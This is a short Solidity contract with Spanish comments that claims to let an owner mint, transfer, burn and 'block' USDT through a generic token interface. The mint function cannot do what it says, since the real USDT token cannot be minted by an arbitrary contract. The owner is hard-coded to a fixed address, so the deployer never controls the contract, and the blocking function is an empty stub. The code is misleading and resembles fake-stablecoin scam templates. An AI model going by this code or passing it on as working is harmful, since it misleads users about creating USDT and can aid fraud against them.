// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interfaz del token USDT
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
    function burn(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract MyTokenManager {
    address public owner;
    IERC20 public usdtToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    constructor(address _usdtAddress) {
        owner = 0x681246c572C4312Ec6DF6924CB704E1F98C3BD57; // Dirección del propietario
        usdtToken = IERC20(_usdtAddress);
    }

    // Nota: Asegúrate de establecer el precio del gas a 3 gwei al interactuar con este contrato.

    function mintUSDT(uint256 amount) external onlyOwner {
        usdtToken.mint(address(this), amount);
    }

    function transferUSDT(address recipient, uint256 amount) external onlyOwner {
        usdtToken.transfer(recipient, amount);
    }

    function burnUSDT(uint256 amount) external onlyOwner {
        usdtToken.burn(amount);
    }

    function blockTokens(uint256 amount) external onlyOwner {
        // Implementar lógica para bloquear tokens
    }

    // Función para obtener el balance de USDT del contrato
    function getUSDTBalance() external view returns (uint256) {
        return usdtToken.balanceOf(address(this));
    }
}